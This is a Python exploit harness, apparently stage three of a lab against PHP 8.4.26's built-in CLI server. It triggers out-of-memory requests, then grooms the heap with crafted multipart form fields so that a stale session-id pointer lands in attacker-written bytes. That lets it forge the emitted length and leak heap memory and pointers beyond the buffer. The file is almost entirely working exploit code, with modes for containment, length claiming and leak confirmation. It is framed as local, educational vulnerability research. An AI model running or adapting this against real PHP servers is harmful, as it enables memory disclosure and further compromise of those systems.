#!/usr/bin/env python3
"""Stage 3 -- control the content, location and timing of the corrupted memory.

Stage 2 established that a follow-up request on a worker that OOM'd reads its
session id out of recycled memory. It left one question open, and it is an
address question rather than a payload question:

    does the emitted length get decoupled from the buffer it is read from?

Because the observable is a *struct field*, the lever is **where your allocation
lands**, not what is inside it. That is only measurable from inside the process,
which is what `build-instrumented.sh` provides. Then:

  PS(id)+0x10  is the `len` field of the zend_string PHP thinks it has
  PS(id)+0x18  is where its bytes are read from

If the stale pointer lands at the *start* of a buffer we control, +0x10 is that
buffer's own header and PHP reads a truthful length -- the benign case. If it
lands *inside* our buffer at offset >= 0x18, +0x10 is our bytes, and the length
becomes ours to choose.

Modes:
  control      consumer only, worker never OOM'd -- the falsification control
  containment  where does PS(id) land relative to our buffers? (field-size sweep)
  claim        write a chosen length into the band and see if it is adopted
  leak         classify the over-read: is the tail memory we did not write?
  all          every mode, with a verdict

Everything is 127.0.0.1 against your own build. Educational/defensive use only.
"""
import argparse
import os
import struct
import sys
import time

HERE = os.path.dirname(os.path.abspath(__file__))
sys.path.insert(0, HERE)
import stage2 as S2  # noqa: E402  (framing + response parsing live there)

# Producer geometry is imported, not restated: these numbers are calibrated and
# duplicating them in a second place is how you end up with a producer that does
# not OOM. PRODUCER_CODE is the "code" geometry; PRODUCER_HEAP is the pairing that
# tends to produce a corrupted allocation instead.
PRODUCER = S2.producer(S2.PRODUCER_CODE)

STAMP_BAND = (0x270, 0x2A0)   # fallback only -- the band measured when this lab was
                             # built. claim/leak scout the offset at runtime instead
CLAIM = 0x1234                # the length we will try to have adopted
HEAP_LO, HEAP_HI = 0x700000000000, 0x800000000000
ALIGN_MASK = ~0x1FFFFF        # Zend allocates in 2 MiB chunks


class ServerGone(Exception):
    """The server process died mid-run. This is expected: the producer induces
    heap corruption, and Zend's allocator answers with `zend_mm_heap corrupted`
    plus abort() -- taking every worker with it. The harness has to treat the
    process dying as a possible outcome rather than a traceback."""


def corruption_note(logpath):
    """Did the server die from its own heap corruption, or something else?"""
    for line in reversed(read_log(logpath).splitlines()[-200:]):
        if not line.startswith("["):
            if "zend_mm_heap corrupted" in line:
                return ("  the server aborted with `zend_mm_heap corrupted` -- that is the")
            if line.strip() and "Accepted" not in line and "Closing" not in line:
                return "  the server died. Last non-log line: %s" % line.strip()[:120]
    return "  the server is no longer accepting connections."


# ----------------------------------------------------------------- request shapes
def consumer(vsize, fields=73, fill=0x50, stamp=None, array_at=69,
             array_len=16, array_value=16):
    """A consumer whose field values are (a) recognisable to probe C and
    (b) individually traceable when they turn up in somebody else's output.

    Values start with 'PPPP' -- that is the marker probe C matches -- and the
    remainder is a repeated byte, per-field in `leak` mode so that a cross-
    allocation read is visible as a change of byte rather than a guess.
    """
    parts = [S2.part(b"PHPSESSID", b"a"),
             S2.part(b"PHP_SESSION_UPLOAD_PROGRESS", b"pwn")]
    for i in range(fields):
        v = bytearray(b"PPPP" + bytes([fill]) * (vsize - 4))
        if stamp is not None:
            lo, hi, value = stamp
            for off in range(lo, hi, 8):
                if off + 8 <= vsize:
                    struct.pack_into("<Q", v, off, value)
        parts.append(S2.part(("s%04d" % i).encode(), bytes(v)))
    for i in range(983 - fields):
        for j in range(array_len if i == array_at else 1):
            parts.append(S2.part(("a%04d[%d]" % (i, j)).encode(), b"x" * array_value))
    return S2.body(parts)


# ----------------------------------------------------------------- instrument log
def read_log(path):
    try:
        return open(path, encoding="utf-8", errors="replace").read()
    except FileNotFoundError:
        return ""


def parse(chunk):
    """-> (PS(id) or None, [(value_addr, value_len), ...])"""
    pid = None
    for line in chunk.splitlines():
        if "[INSTR-A] PS(id)=" in line:
            pid = int(line.split()[1].split("=")[1], 16)
    bufs = []
    for line in chunk.splitlines():
        if "[INSTR-C]" in line:
            f = line.split()
            try:
                bufs.append((int(f[3].split("=")[1], 16), int(f[4].split("=")[1])))
            except (IndexError, ValueError):
                pass
    return pid, bufs


def exchange(port, logpath, payload, cookies=0):
    before = len(read_log(logpath))
    try:
        raw = S2.send(port, payload, cookies=cookies)
    except OSError as exc:
        raise ServerGone(str(exc))
    time.sleep(0.35)
    return raw, read_log(logpath)[before:]


def after_oom(port, logpath, payload):
    """One OOM producer, then the request under test on a following connection."""
    try:
        S2.send(port, PRODUCER, cookies=S2.COOKIE_PAIRS)
    except OSError as exc:
        raise ServerGone(str(exc))
    return exchange(port, logpath, payload)


def containing(bufs, target):
    """Which controlled buffer spans `target`, and at what offset?"""
    for addr, length in bufs:
        if addr <= target < addr + length:
            return addr, length, target - addr
    return None


# ----------------------------------------------------------------- modes
def mode_control(args):
    print("### control -- consumer only, no producer sent")
    print("  This is only a valid control on a worker pool that has never had an OOM")
    print("  request. A pool that has served one is poisoned, and this mode will say so.")
    print("  %-6s %-16s %-8s %s" % ("rep", "PS(id)", "id len", "nearest controlled buffer"))
    poisoned = False
    for rep in range(args.reps):
        try:
            raw, chunk = exchange(args.port, args.log, consumer(1024))
        except ServerGone:
            print("  server died before rep %d" % rep)
            break
        pid, bufs = parse(chunk)
        sid = S2.session_id(raw)
        if pid is None or not bufs:
            print("  %-6d %-16s %-8s (no probe output -- is the log path right?)"
                  % (rep, "-", len(sid) if sid else "-"))
            continue
        nearest = min(bufs, key=lambda b: abs(b[0] - pid))
        delta = nearest[0] - pid
        if abs(delta) < 0x10000:
            poisoned = True
        print("  %-6d 0x%-14x %-8s nearest at %s delta %+d"
              % (rep, pid, len(sid) if sid else "-", hex(nearest[0]), delta))
    print()
    print("RESULT control %s" % ("POISONED" if poisoned else "OK"))
    if poisoned:
        print("  !! PS(id) is sitting within a controlled buffer already, so this pool has")
        print("     been poisoned by an earlier producer. Not a control -- restart the")
        print("     server (stage3.sh does this) and run this mode first.")
        print()
        return False
    print("  PS(id) is far from every buffer we control, as it should be.")
    print()
    return True


def mode_containment(args):
    print("### containment -- where does PS(id) land relative to buffers we control?")
    print("  +0x10 is the length, +0x18 is the data. Landing at offset >= 0x18 inside a")
    print("  buffer means PHP reads OUR bytes as the length.")
    print()
    print("  %-7s %-9s %-16s %s" % ("fields", "vsize", "PS(id)", "containment"))
    found = 0
    configs = [(73, 256), (73, 512), (73, 1024), (73, 4096), (16, 8192), (8, 16384)]
    for fields, vsize in configs:
        body = consumer(vsize, fields=fields)
        if len(body) > 1000000:
            print("  %-7d %-9d %-16s skipped (body %d > 1 MiB)"
                  % (fields, vsize, len(body)))
            continue
        detail, seen = "no containment", None
        for rep in range(args.reps):
            try:
                raw, chunk = after_oom(args.port, args.log, body)
            except ServerGone:
                break
            pid, bufs = parse(chunk)
            if pid is None or not bufs:
                continue
            seen = pid
            hit = containing(bufs, pid + 0x10)
            if hit:
                addr, length, off = hit
                if off >= 0x18:
                    found += 1
                    detail = "*** INSIDE a %d-byte buffer at +0x%x ***" % (length, off)
                    break
                detail = "inside %d-byte buffer but at +0x%x (< 0x18)" % (length, off)
        print("  %-7d %-9d %-16s %s"
              % (fields, vsize, hex(seen) if seen else "-", detail))
    print()
    print("RESULT containment %d" % found)
    print("configs with a usable containment: %d -- %s"
          % (found, "proceed" if found else "check the build is instrumented"))
    print()
    return found


CONFIGS = [(73, 256), (73, 512), (73, 1024), (73, 4096), (16, 8192), (8, 16384)]


def sweep_containment(args, reps=1, label="  ", first_only=False):
    """Which consumer shapes put PS(id)+0x10 inside a buffer we control?

    Shape discovery has to be redone per mode rather than assumed. The landing
    depends on the pool's *accumulated history*, not just on the current request:
    a warmed pool (several shapes already through it) reliably lands PS(id) at one
    address, while the same request on a fresh pool lands somewhere else entirely.
    Assuming a shape -- `vsize=1024` -- is what made an earlier claim run adopt
    nothing while containment mode was simultaneously reporting +0x138.

    Returns [(fields, vsize, offset), ...] for shapes whose containment is usable.

    `first_only` stops at the first usable shape. Every config costs a producer, and
    each producer corrupts the heap a little more, so a caller that needs one shape
    (claim, leak) must not walk all six -- doing so killed the pool before the
    measurement ran, which looked exactly like the bug not reproducing.
    """
    hits = []
    for fields, vsize in CONFIGS:
        body = consumer(vsize, fields=fields)
        if len(body) > 1000000:
            continue
        for rep in range(reps):
            try:
                raw, chunk = after_oom(args.port, args.log, body)
            except ServerGone:
                return hits
            pid, bufs = parse(chunk)
            if pid is None or not bufs:
                continue
            hit = containing(bufs, pid + 0x10)
            if hit:
                _addr, length, off = hit
                if off >= 0x18:
                    hits.append((fields, vsize, off))
                    print("%s%-7d %-9d len field inside a %d-byte buffer at +0x%x"
                          % (label, fields, vsize, length, off))
                    if first_only:
                        return hits
                    break
    return hits


def stamp_band(off):
    """A window around the measured len offset, 8-aligned, never below 0x18."""
    lo = max(0x18, off - 0x10)
    lo -= lo % 8
    return lo, off + 0x18


def mode_claim(args):
    print("### claim -- write a length into the contained buffer, see if it is adopted")
    print()
    hits = sweep_containment(args, reps=1, first_only=True)
    if not hits:
        print("  could not place PS(id)+0x10 inside a controlled buffer on this pool,")
        print("  so there is nothing to aim at and no claim can be adopted here.")
        print()
        print("RESULT claim 0")
        return 0
    fields, vsize, off = hits[0]
    band = stamp_band(off)
    print("  aiming with fields=%d, vsize=%d: the len field is at +0x%x of the value"
          % (fields, vsize, off))
    print("  stamping 0x%x at every 8-aligned offset in [0x%x, 0x%x)"
          % (CLAIM, band[0], band[1]))
    print()
    body = consumer(vsize, fields=fields, stamp=(band[0], band[1], CLAIM))
    adopted = 0
    print("  %-6s %-10s %s" % ("rep", "id len", "verdict"))
    for rep in range(args.reps):
        try:
            raw, chunk = after_oom(args.port, args.log, body)
        except ServerGone:
            print("  %-6d %-10s server died" % (rep, "-"))
            break
        sid = S2.session_id(raw)
        if sid is None:
            print("  %-6d %-10s no Set-Cookie" % (rep, "-"))
            continue
        ok = len(sid) == CLAIM
        adopted += ok
        print("  %-6d %-10d %s" % (rep, len(sid),
                                   "*** length adopted our claim ***" if ok
                                   else "own buffer length (no containment this run)"))
    print()
    print("RESULT claim %d" % adopted)
    print("claim adopted %d of %d reps" % (adopted, args.reps))
    print()
    return adopted


def mode_leak(args):
    print("### leak -- is the tail memory we did NOT write?")
    print("  Every field is filled with its own byte (value[0:4] stays 'PPPP' so probe C")
    print("  still reports where it lives). Two tells that survive our own filler:")
    print("    1. other fields' marker bytes appearing inside the emitted value")
    print("    2. u64 values in the heap range, which our filler never produces")
    print("  Closed with one inequality: every leaked pointer must lie beyond the end of")
    print("  the buffer the read started in.")
    print()
    hits = sweep_containment(args, reps=1, first_only=True)
    if not hits:
        print("  could not place PS(id)+0x10 inside a controlled buffer on this pool,")
        print("  so there is nothing to aim at and no over-read to confirm here.")
        print()
        print("RESULT leak 0")
        return 0
    fields, vsize, off = hits[0]
    band = stamp_band(off)
    print("  aiming with fields=%d, vsize=%d: the len field is at +0x%x of the value"
          % (fields, vsize, off))
    print()
    body = consumer(vsize, fields=fields, fill=0x40, stamp=(band[0], band[1], CLAIM))
    leaks = 0
    for rep in range(args.reps):
        try:
            raw, chunk = after_oom(args.port, args.log, body)
        except ServerGone:
            print("  server died before rep %d" % rep)
            break
        sid = S2.session_id(raw)
        pid, bufs = parse(chunk)
        if sid is None:
            print("  rep %d: no cookie" % rep)
            continue
        print("  " + "-" * 70)
        print("  rep %d: emitted id len=%d" % (rep, len(sid)))
        if len(sid) <= vsize:
            print("        no over-read this run (id not longer than our buffer)")
            continue

        # tell 1 -- long runs of a single byte => different source buffers
        runs, cur, start = [], sid[0], 0
        for i, b in enumerate(sid):
            if b != cur:
                if i - start >= 16:
                    runs.append((start, i - start, cur))
                cur, start = b, i
        runs.append((start, len(sid) - start, cur))
        marked = [r for r in runs if r[2] not in (0x50, 0x00)]
        print("        long single-byte runs: %d (of which non-'P': %d)"
              % (len(runs), len(marked)))
        for off, ln, b in marked[:6]:
            printable = chr(b) if 32 <= b < 127 else "0x%02x" % b
            print("          +0x%04x %5d %s   <- another field's marker" % (off, ln, printable))

        # tell 2 -- address-like u64
        addrs = []
        for off in range(0, len(sid) - 7, 8):
            v = struct.unpack_from("<Q", sid, off)[0]
            if HEAP_LO <= v < HEAP_HI:
                addrs.append((off, v))
        print("        heap-like u64 found: %d" % len(addrs))
        for off, v in addrs[:6]:
            print("          +0x%04x = 0x%x" % (off, v))

        # the inequality
        if pid is not None and bufs:
            hit = containing(bufs, pid + 0x10)
            if hit and addrs:
                addr, length, off = hit
                end = addr + length
                beyond = [(o, v) for o, v in addrs if v >= end]
                print("        read started in buffer 0x%x (len %d), which ends at 0x%x"
                      % (addr, length, end))
                if beyond:
                    leaks += 1
                    print("        *** %d leaked value(s) lie BEYOND that end ***"
                          % len(beyond))
                    base = beyond[0][1] & ALIGN_MASK
                    print("        -> 0x%x & ~0x1FFFFF = 0x%x  (2 MiB-aligned Zend chunk)"
                          % (beyond[0][1], base))
                else:
                    print("        every leaked value sits inside our own buffer")
            elif addrs:
                print("        (containment not reported this run; tells 1/2 still stand)")
    print()
    print("RESULT leak %d" % leaks)
    print("runs with a confirmed out-of-buffer read: %d" % leaks)
    print()
    return leaks


def main():
    ap = argparse.ArgumentParser(
        description=__doc__, formatter_class=argparse.RawDescriptionHelpFormatter)
    ap.add_argument("mode", choices=["control", "containment", "claim", "leak", "all"])
    ap.add_argument("--port", type=int, default=18626)
    ap.add_argument("--log", default=os.path.join(HERE, "logs", "instr-server.log"),
                    help="stderr capture of the instrumented server")
    ap.add_argument("--reps", type=int, default=4)
    args = ap.parse_args()

    if not read_log(args.log):
        print("no probe output at %s\n" % args.log)
        print("The instrumented server writes its probes to stderr. Start it with:")
        print("  ./build-instrumented.sh")
        print("  PHP_CLI_SERVER_WORKERS=4 build-instrumented/php-8.4.26/sapi/cli/php \\")
        print("      -S 127.0.0.1:%d -t www 2>%s &" % (args.port, args.log))
        print()
        print("If the log exists but has no [INSTR- prefix, the running server is not")
        print("the instrumented build.")
        return 2

    c = cl = lk = None
    if args.mode in ("control", "all"):
        mode_control(args)
    if args.mode in ("containment", "all"):
        c = mode_containment(args)
    if args.mode in ("claim", "all"):
        cl = mode_claim(args)
    if args.mode in ("leak", "all"):
        lk = mode_leak(args)

    if "zend_mm_heap corrupted" in read_log(args.log):
        print(corruption_note(args.log))
        print("  same corruption the vulnerability induces. Restart the server and re-run")
        print("  the failed mode -- stage3.sh does this automatically.")
        print()

    if args.mode == "all":
        print("=" * 72)
        print("VERDICT")
        print("  containment reached      : %s" % ("yes" if c else "no"))
        print("  length claim adopted     : %s" % ("yes" if cl else "no"))
        print("  out-of-buffer read proven: %s" % ("yes" if lk else "no"))
        if c and cl and lk:
            print()
            print("  Content, location and timing of the corrupted memory are all under")
            print("  attacker control: the emitted length is decoupled from the buffer it")
            print("  is read from, and the tail is memory this request never wrote.")
            return 0
        print()
        print("  Partial: the heap-grooming is probabilistic. Re-run, or vary the")
        print("  field size -- see the containment sweep in docs/ANALYSIS.md §7.")
        return 1
    return 0


if __name__ == "__main__":
    sys.exit(main())
